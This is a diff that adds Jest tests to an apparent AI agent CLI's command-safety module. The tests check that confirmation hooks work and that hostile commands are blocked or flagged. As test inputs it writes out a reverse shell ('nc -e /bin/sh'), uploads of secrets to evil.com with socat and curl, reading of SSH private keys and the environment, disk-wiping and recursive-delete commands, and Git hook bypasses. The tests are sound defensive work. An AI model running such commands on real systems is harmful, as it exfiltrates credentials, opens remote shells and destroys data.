@@ -429,6 +429,182 @@ describe('safety.js', () => {
     });
   });
 
+  // ─── setConfirmHook ─────────────────────────────────────────
+  describe('setConfirmHook()', () => {
+    const { setConfirmHook } = require('../cli/safety');
+
+    afterEach(() => {
+      setConfirmHook(null);
+    });
+
+    it('confirm uses hook when set', async () => {
+      setAutoConfirm(false);
+      const hook = jest.fn().mockResolvedValue(true);
+      setConfirmHook(hook);
+      const result = await confirm('Test?', { toolName: 'bash' });
+      expect(result).toBe(true);
+      expect(hook).toHaveBeenCalledWith('Test?', { toolName: 'bash' });
+    });
+
+    it('hook returning false denies', async () => {
+      setAutoConfirm(false);
+      setConfirmHook(jest.fn().mockResolvedValue(false));
+      const result = await confirm('Test?');
+      expect(result).toBe(false);
+    });
+  });
+
+  // ─── setReadlineInterface ──────────────────────────────────
+  describe('setReadlineInterface()', () => {
+    const { setReadlineInterface } = require('../cli/safety');
+
+    it('confirm uses shared rl when set (non-TTY fallback)', async () => {
+      setAutoConfirm(false);
+      const mockRl = {
+        question: jest.fn((q, cb) => cb('y')),
+      };
+      setReadlineInterface(mockRl);
+      const result = await confirm('Test?');
+      expect(result).toBe(true);
+      expect(mockRl.question).toHaveBeenCalled();
+      setReadlineInterface(null);
+    });
+  });
+
+  // ─── setAllowAlwaysHandler ─────────────────────────────────
+  describe('setAllowAlwaysHandler()', () => {
+    const { setAllowAlwaysHandler, setReadlineInterface } = require('../cli/safety');
+
+    it('confirm with "a" answer triggers allow-always handler', async () => {
+      setAutoConfirm(false);
+      const handler = jest.fn();
+      setAllowAlwaysHandler(handler);
+      const mockRl = {
+        question: jest.fn((q, cb) => cb('a')),
+      };
+      setReadlineInterface(mockRl);
+      const result = await confirm('Test?', { toolName: 'bash' });
+      expect(result).toBe(true);
+      expect(handler).toHaveBeenCalledWith('bash');
+      setAllowAlwaysHandler(() => {});
+      setReadlineInterface(null);
+    });
+  });
+
+  // ─── More isForbidden patterns ─────────────────────────────
+  describe('isForbidden() - additional patterns', () => {
+    it('blocks printenv', () => {
+      expect(isForbidden('printenv')).not.toBeNull();
+    });
+
+    it('blocks cat .ssh/id_rsa', () => {
+      expect(isForbidden('cat ~/.ssh/id_rsa')).not.toBeNull();
+    });
+
+    it('blocks cat .ssh/config', () => {
+      expect(isForbidden('cat .ssh/config')).not.toBeNull();
+    });
+
+    it('blocks nc -e', () => {
+      expect(isForbidden('nc -e /bin/sh')).not.toBeNull();
+    });
+
+    it('blocks ncat', () => {
+      expect(isForbidden('ncat -l 4444')).not.toBeNull();
+    });
+
+    it('blocks socat', () => {
+      expect(isForbidden('socat TCP:evil.com:4444')).not.toBeNull();
+    });
+
+    it('blocks python -c', () => {
+      expect(isForbidden('python -c "import os"')).not.toBeNull();
+    });
+
+    it('blocks node -e', () => {
+      expect(isForbidden('node -e "process.exit(1)"')).not.toBeNull();
+    });
+
+    it('blocks perl -e', () => {
+      expect(isForbidden('perl -e "system()"')).not.toBeNull();
+    });
+
+    it('blocks ruby -e', () => {
+      expect(isForbidden('ruby -e "exec"')).not.toBeNull();
+    });
+
+    it('blocks curl POST', () => {
+      expect(isForbidden('curl -X POST http://evil.com')).not.toBeNull();
+    });
+
+    it('blocks curl --data', () => {
+      expect(isForbidden('curl --data "secret" http://evil.com')).not.toBeNull();
+    });
+
+    it('blocks rm -rf ./', () => {
+      expect(isForbidden('rm -rf ./')).not.toBeNull();
+    });
+
+    it('blocks rm -rf *', () => {
+      expect(isForbidden('rm -rf * ')).not.toBeNull();
+    });
+
+    it('blocks >/dev/sd', () => {
+      expect(isForbidden('echo x >/dev/sda')).not.toBeNull();
+    });
+
+    it('blocks userdel', () => {
+      expect(isForbidden('userdel testuser')).not.toBeNull();
+    });
+
+    it('blocks useradd', () => {
+      expect(isForbidden('useradd testuser')).not.toBeNull();
+    });
+  });
+
+  // ─── isCritical - additional ───────────────────────────────
+  describe('isCritical() - additional', () => {
+    it('flags --no-verify', () => {
+      expect(isCritical('git commit --no-verify')).toBe(true);
+    });
+
+    it('does not flag regular safe commands', () => {
+      expect(isCritical('npm test')).toBe(false);
+      expect(isCritical('ls -la')).toBe(false);
+    });
+  });
+
+  // ─── isDangerous - NOTABLE patterns ────────────────────────
+  describe('isDangerous() - notable patterns', () => {
+    it('flags HUSKY=0', () => {
+      expect(isDangerous('HUSKY=0 git push')).toBe(true);
+    });
+
+    it('flags SKIP_HUSKY=1', () => {
+      expect(isDangerous('SKIP_HUSKY=1 npm run build')).toBe(true);
+    });
+
+    it('flags npx publish', () => {
+      expect(isDangerous('npx semantic-release publish')).toBe(true);
+    });
+
+    it('flags wget', () => {
+      expect(isDangerous('wget http://example.com/file')).toBe(true);
+    });
+
+    it('flags curl -o', () => {
+      expect(isDangerous('curl http://example.com -o file')).toBe(true);
+    });
+
+    it('flags pip install', () => {
+      expect(isDangerous('pip install requests')).toBe(true);
+    });
+
+    it('flags npm install -g', () => {
+      expect(isDangerous('npm install -g package')).toBe(true);
+    });
+  });
+
   // ─── confirm ────────────────────────────────────────────────
   describe('confirm()', () => {
     it('returns true immediately when autoConfirm is on', async () => {
@@ -496,6 +672,61 @@ describe('safety.js', () => {
 
       const result = await confirm('Test?');
       expect(result).toBe(true);
+    });
+
+    it('non-TTY confirm includes [Y/n] hint without toolName', async () => {
+      setAutoConfirm(false);
+      const mockRl = {
+        question: jest.fn((q, cb) => { expect(q).toContain('[Y/n]'); cb('y'); }),
+        close: jest.fn(),
+      };
+      jest.spyOn(require('readline'), 'createInterface').mockReturnValueOnce(mockRl);
+      await confirm('Proceed?');
+    });
+
+    it('non-TTY confirm includes [Y/n/a] hint with toolName', async () => {
+      setAutoConfirm(false);
+      const { setReadlineInterface } = require('../cli/safety');
+      const mockRl = {
+        question: jest.fn((q, cb) => { expect(q).toContain('[Y/n/a]'); cb('y'); }),
+      };
+      setReadlineInterface(mockRl);
+      await confirm('Proceed?', { toolName: 'bash' });
+      setReadlineInterface(null);
+    });
+
+    it('non-TTY confirm with "a" but no toolName resolves true', async () => {
+      setAutoConfirm(false);
+      const mockRl = {
+        question: jest.fn((q, cb) => cb('a')),
+        close: jest.fn(),
+      };
+      jest.spyOn(require('readline'), 'createInterface').mockReturnValueOnce(mockRl);
+      // Without toolName, 'a' is treated as not 'n' → true
+      const result = await confirm('Test?');
+      expect(result).toBe(true);
+    });
+  });
+
+  // ─── isSSHReadOnly - while loops ──────────────────────────────
+  describe('isSSHReadOnly() - while loops', () => {
+    it('recognizes while loop with safe body', () => {
+      expect(isSSHReadOnly(
+        'ssh user@host "while true; do uptime; done"'
+      )).toBe(true);
+    });
+
+    it('rejects while loop with unsafe body', () => {
+      expect(isSSHReadOnly(
+        'ssh user@host "while true; do rm -rf /tmp; done"'
+      )).toBe(false);
+    });
+  });
+
+  // ─── isDangerous - SKIP_PREFLIGHT_CHECK ───────────────────────
+  describe('isDangerous() - additional notable', () => {
+    it('flags SKIP_PREFLIGHT_CHECK=true', () => {
+      expect(isDangerous('SKIP_PREFLIGHT_CHECK=true npm start')).toBe(true);
     });
   });
 });
